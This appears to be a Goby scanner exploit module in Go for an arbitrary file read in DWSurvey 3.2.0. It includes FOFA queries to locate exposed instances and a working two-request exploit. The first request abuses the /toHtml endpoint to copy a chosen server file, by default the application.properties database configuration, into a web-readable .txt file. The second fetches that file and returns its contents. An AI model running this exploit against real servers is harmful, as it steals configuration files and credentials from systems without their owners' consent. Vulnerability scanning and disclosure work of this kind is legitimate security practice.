package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Dwsurvey Arbitrary File Read",
    "Description": "<p>DWSurvey is a convenient, efficient and stable survey questionnaire system, an open source questionnaire form system based on JAVA WEB.</p><p>The filePath parameter of the ToHtmlServlet.java file in the dwsurvey-oss-v3.2.0 version has an arbitrary file reading vulnerability.</p>",
    "Impact": "Dwsurvey 3.2 Arbitrary File Read",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.surveyform.cn\">https://www.surveyform.cn/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
    "Product": "DWSurvey",
    "VulType": [
        "File Read"
    ],
    "Tags": [
        "File Read"
    ],
    "Translation": {
        "CN": {
            "Name": "Dwsurvey 任意文件读取漏洞",
            "Description": "<p>DWSurvey是一款方便、高效、稳定的调研问卷系统，一款基于 JAVA WEB 的开源问卷表单系统。</p><p>dwsurvey-oss-v3.2.0 版本中 ToHtmlServlet.java 文件的 filePath 参数存在任意文件读取漏洞。</p>",
            "Impact": "<p>dwsurvey-oss-v3.2.0 版本中 ToHtmlServlet.java 文件的 filePath 参数存在任意文件读取漏洞，攻击者可通过该漏洞读取泄露源码、数据库配置⽂件等等，导致⽹站处于极度不安全状态。</p>",
            "Recommendation": "<p>厂商暂未提供修复方案，请关注厂商网站及时更新: <a href=\"https://www.surveyform.cn\">https://www.surveyform.cn</a></p><p>1、通过防⽕墙等安全设备设置访问策略，设置⽩名单访问。</p><p>2、如⾮必要，禁⽌公⽹访问该系统。</p>",
            "Product": "DWSurvey",
            "VulType": [
                "文件读取"
            ],
            "Tags": [
                "文件读取"
            ]
        },
        "EN": {
            "Name": "Dwsurvey Arbitrary File Read",
            "Description": "<p>DWSurvey is a convenient, efficient and stable survey questionnaire system, an open source questionnaire form system based on JAVA WEB.</p><p>The filePath parameter of the ToHtmlServlet.java file in the dwsurvey-oss-v3.2.0 version has an arbitrary file reading vulnerability.</p>",
            "Impact": "Dwsurvey 3.2 Arbitrary File Read",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage update: <a href=\"https://www.surveyform.cn\">https://www.surveyform.cn/</a></p><p>1. Set access policies and whitelist access through security devices such as firewalls.</p><p>2.If not necessary, prohibit public network access to the system.</p>",
            "Product": "DWSurvey",
            "VulType": [
                "File Read"
            ],
            "Tags": [
                "File Read"
            ]
        }
    },
    "FofaQuery": "(title=\"调问-专业且开源的问卷表单系统\" || body=\"Powered by <a href=\\\"http://www.dwsurvey.net\\\" style=\")",
    "GobyQuery": "(title=\"调问-专业且开源的问卷表单系统\" || body=\"Powered by <a href=\\\"http://www.dwsurvey.net\\\" style=\")",
    "Author": "1291904552@qq.com",
    "Homepage": "https://www.surveyform.cn",
    "DisclosureDate": "2021-09-22",
    "References": [
        "https://github.com/wkeyuan/DWSurvey"
    ],
    "HasExp": true,
    "Is0day": false,
    "Level": "2",
    "CVSS": "8.5",
    "CVEIDs": [],
    "CNVD": [],
    "CNNVD": [],
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/",
                "follow_redirect": false,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExpParams": [
        {
            "name": "filepath",
            "type": "createSelect",
            "value": "/WEB-INF/classes/conf/application.properties",
            "show": ""
        }
    ],
    "ExpTips": {},
    "AttackSurfaces": {
        "Application": [
            "DWSurvey"
        ],
        "Support": [],
        "Service": [],
        "System": [],
        "Hardware": []
    },
    "PocId": "10227"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			FileRead := goutils.RandomHexString(4)
			uri1 := "/toHtml?filePath=/&fileName=" + FileRead + ".txt&url=/WEB-INF/classes/conf/application.properties"
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			if resp1, err := httpclient.DoHttpRequest(u, cfg1); err == nil {
				if resp1.StatusCode == 200 {
					uri2 := "/" + FileRead + ".txt"
					cfg2 := httpclient.NewGetRequestConfig(uri2)
					cfg2.VerifyTls = false
					if resp2, err := httpclient.DoHttpRequest(u, cfg2); err == nil {
						return resp2.StatusCode == 200 && strings.Contains(resp2.RawBody, "settings")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			cmd := ss.Params["filepath"].(string)
			FileRead := goutils.RandomHexString(4)
			uri1 := "/toHtml?filePath=/&fileName=" + FileRead + ".txt&url=" + cmd
			cfg1 := httpclient.NewGetRequestConfig(uri1)
			cfg1.VerifyTls = false
			if resp1, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg1); err == nil {
				if resp1.StatusCode == 200 {
					uri2 := "/" + FileRead + ".txt"
					cfg2 := httpclient.NewGetRequestConfig(uri2)
					cfg2.VerifyTls = false
					if resp2, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg2); err == nil {
						if resp2.StatusCode == 200 {
							expResult.Output = resp2.RawBody
							expResult.Success = true
						}
					}
				}
			}
			return expResult
		},
	))
}
